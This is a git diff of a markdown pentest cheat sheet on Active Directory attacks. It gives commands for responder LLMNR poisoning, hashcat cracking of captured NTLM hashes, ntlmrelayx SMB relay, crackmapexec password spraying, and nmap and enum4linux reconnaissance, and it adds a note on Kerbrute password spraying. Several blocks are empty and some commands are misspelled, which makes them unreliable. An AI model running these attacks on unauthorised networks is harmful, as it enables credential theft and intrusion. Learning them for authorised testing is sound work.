@@ -16,14 +16,14 @@ nmap -sV -sC -A -p- IP-Address
 ```bash
 responder -I <interface> -rdw
 ```
-- After capturing NTLM Hash (copy the captured hash into .txt format) copy full hash from username to end of the hash.
+#### After capturing NTLM Hash (copy the captured hash into .txt format) copy full hash from username to end of the hash.
 
 ```bash
 hashcat -m 5600 hash.txt /path/to/wordlist.txt
 ```
 
 ### SMB Relay attack
-- Make sure you turn off the SMB and HTTP from responder configuration
+#### Make sure you turn off the SMB and HTTP from responder configuration
 
 ```bash
 nano /etc/responder/Responder.conf
@@ -34,7 +34,7 @@ nano /etc/responder/Responder.conf
 nmap --script=smb2-security-mode.nse -p 445 192.168.1.1/24,134 -Pn --open | tee -a target.txt
 ```
 
-- Use ntlmrelayx
+#### Use ntlmrelayx
 ```bash
 python3 ntmlrelayx.py -tf /path/to/target_host_nmap_above -smb3supprt
 ```
@@ -46,7 +46,7 @@ crackmapexec smb "10.0.9.0/24" -u "FirstName.LastName" -p /path/to/password.txt
 ```
 
 ### Active Directory
--Nmap. 
+#### Nmap. 
 ```bash
 nmap -Pn -sV -sC -oN top IP-Address
 ```
@@ -60,11 +60,12 @@ nmap -Pn -sV -sC -oN top IP-Address
 636 → ldaps
 445 → SMB
 ```
-enum4linux
+#### enum4linux
 ```bash
 enum4linux -A IP-Address
 ```
  #### Abusing Kerberos.
+ - Kerbrute can be used to perform discovery of user,passwords and even password spray. It's just a bruteforce tool so you need have a list of username and password. Recommendation : Try building custom username (of an organization) and password.
 ```bash
 
 ```
@@ -80,11 +81,6 @@ enum4linux -A IP-Address
 ```
 ```bash
 
-``````bash
-
-``````bash
-
-``````bash
 
 ```
 
